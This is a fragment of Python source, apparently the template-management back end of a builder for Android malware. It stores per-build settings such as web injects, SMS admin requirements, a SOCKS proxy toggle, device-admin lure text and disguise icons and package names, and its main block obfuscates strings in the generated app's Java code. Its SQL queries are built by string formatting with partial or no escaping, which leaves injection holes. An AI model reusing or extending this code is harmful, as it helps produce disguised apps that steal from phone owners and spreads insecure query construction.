		api = data['api'].replace('"', r'\"')
		if '%DATE%' not in api:
			api = '%DATE%' + api
		
		sql = 'update templates set client_id="{}", icon_set="{}", app_name="{}", package_name="{}", api="{}", injects="{}", sms_admin_required={}, socks_enabled={}, device_admin_label="{}", device_admin_descr="{}" where id={}'.format(
			data['client_id'].replace('"', r'\"'),
			data['icon_set'].replace('"', r'\"'),
			data['app_name'].replace('"', r'\"').strip(),
			data['package_name'].replace('"', r'\"').strip(),
			api,
			data['injects'].replace('"', r'\"').strip(),
			data['sms_admin_required'],
			data['socks_enabled'],
			data['device_admin_label'].replace('"', r'\"').strip(),
			data['device_admin_descr'].replace('"', r'\"').strip(),
			data['tpl_id'].replace('"', r'\"'),
			)

		self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
		return 'Saved success'

	
	def get_last_template_id(self):
	
		sql = 'select id from templates order by id desc limit 1'
		res = self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
		
		return res[0][0]
	
	# add
	def clone_tpl(self, data, msg=''):
		
		api = data['api'].replace('"', r'\"')
		if '%DATE%' not in api:
			api = '%DATE%' + api
			
		sql = 'insert into templates(client_id, icon_set, app_name, package_name, api, injects, sms_admin_required, socks_enabled, device_admin_label, device_admin_descr) values("{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}")'.format(
			data['client_id'].replace('"', r'\"'),
			data['icon_set'].replace('"', r'\"'),
			data['app_name'].replace('"', r'\"').strip(),
			data['package_name'].replace('"', r'\"').strip(),
			api,
			data['injects'].replace('"', r'\"').strip(),
			data['sms_admin_required'],
			data['socks_enabled'],
			data['device_admin_label'],
			data['device_admin_descr'],
			)
		
		self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
		if msg:
			return msg
			
		return 'Cloned success'
	
	def get_tpl_info(self, tpl_id=''):
		
		if tpl_id:
			res = self.db.execute('select client_id, icon_set, app_name, package_name, api, injects, sms_admin_required, socks_enabled, device_admin_label, device_admin_descr from templates where id={}'.format(tpl_id))[0]
		else:
			res = self.db.execute('select client_id, icon_set, app_name, package_name, api, injects, sms_admin_required, socks_enabled, device_admin_label, device_admin_descr from templates order by id desc limit 1')[0]
		
		data = {
			'client_id':	res[0],
			'icon_set': res[1],
			'app_name': res[2],
			'package_name': res[3],
			'api': res[4],
			'injects': res[5],
			'sms_admin_required': res[6],
			'socks_enabled': res[7],
			'device_admin_label': res[8],
			'device_admin_descr': res[9],
		}

		return data

	#~ def get_first_icon(self):
		#~ return hlp.ls2(self.root_builder + 'app_icons', names=True, folders=True)[0]
		
	def get_icon_select(self, icon_set=''):

		icons = hlp.ls2(self.root_builder + 'app_icons', names=True, folders=True)
		
		html = ''
		for c in sorted(icons):
			if c == icon_set:
				html += '<option value="{0}" selected>{0}</option>'.format(c)
			else:
				html += '<option value="{0}">{0}</option>'.format(c)

		return html
		
	def delete_tpl(self, tpl_id):
		
		res = self.db.execute('delete from templates where id={}'.format(tpl_id))
		return 'Template #{} deleted success\n'.format(tpl_id)

		
		
		
		
		
if __name__ == '__main__':
	from config import *
	a = App()
	a.init(None, PATH, PATH_BUILDER, UPLOAD_TO, db, BUILDER_BASIC_AUTH)
	#~ a.get_xml_strings()
	a.hide_strings(a.root + 'app/src/main/java/com/moonny/constants/S.java', True)



